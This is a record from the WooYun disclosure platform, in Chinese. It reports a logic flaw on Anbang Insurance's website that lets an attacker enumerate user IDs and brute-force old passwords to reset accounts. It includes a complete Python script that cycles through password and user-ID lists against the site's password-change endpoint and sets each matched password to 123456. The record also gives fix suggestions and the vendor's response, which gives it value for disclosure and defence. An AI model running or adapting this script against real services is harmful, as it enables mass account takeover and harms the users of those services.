{"id": 28848, "wybug_id": "wooyun-2015-0119851", "wybug_title": "安邦保险集团存在逻辑漏洞可遍历用户ID暴力破解用户原始密码进而重置用户密码(附脚本)", "wybug_corp": "安邦保险集团", "wybug_author": "月无痕", "wybug_date": "2015-06-12 08:15", "wybug_open_date": "2015-06-17 08:16", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 漏洞URL：http://www.ab95569.com 详细说明：  利用burpsuite进行抓包后发现，userID为纯数字，oldPwd可暴力破解。如图：\n\n用户名为邮箱，虽然无法根据userid得到确切的用户名，但可以重置所有用户的密码。写一个python暴力破解的poc，如下：\n#!/usr/bin/python#coding: utf-8import sysimport urllibimport urllib2def get_headers(dt):\theaders = {\t\t\t'Accept': '*/*',\t\t\t'X-Requested-With': 'XMLHttpRequest',\t\t\t'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36',\t\t\t'Connection': 'keep-alive',\t\t\t'Content-Type': 'application/x-www-form-urlencoded',\t\t\t'Host': 'www.ab95569.com',\t\t\t'Content-Length': dt,\t\t\t'Accept-Encoding': 'gzip, deflate',\t\t\t'Accept-Language': 'zh-CN,zh;q=0.8',\t\t\t'Cookie': 'pgv_pvi=9633317888'\t\t\t}\treturn headersdef guess_password(oldpwd,userid):\tfor i in oldpwd:\t\tfor j in userid:\t\t\tparams = urllib.urlencode({'oldPwd':i,'newPwd':'123456','userId':j})\t\t\tdt = len(params)\t\t\theaders = get_headers(dt)\t\t\ttry:\t\t\t\turl = 'http://www.ab95569.com/user/updPwd.htm'\t\t\t\treq = urllib2.Request(url,params,headers=headers)\t\t\t\tresponse = urllib2.urlopen(req,timeout=3)\t\t\t\tdata = response.read()\t\t\t\tif '保存成功' in data:\t\t\t\t\tprint 'userid: %s, oldpwd: %s' % (j,i)\t\t\texcept Exception, e:\t\t\t\tprint edef get_oldpwd(filename1):\ttemp1 = []\tfiles = open(filename1,'r')\tfor i in files:\t\ti = i.strip()\t\ttemp1.append(i)\treturn temp1def get_userid(filename2):\ttemp2 = []\tfiles = open(filename2,'r')\tfor i in files:\t\ti = i.strip()\t\ttemp2.append(i)\treturn temp2if __name__==\"__main__\":\toldpwd = get_oldpwd('password.txt')\tuserid = get_userid('userid.txt')\tguess_password(oldpwd,userid)\n   漏洞证明：  \n\n为了不修改其他用户的数据，我只用自己的2个用户进行了测试。密码均修改为123456。   修复方案：  1.userId变为用户不可控2.对密码修改时进行逻辑判断   版权声明：转载请注明来源 月无痕@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-17 08:16 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 2015-08-25：十分感谢，我们已经组织人员修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}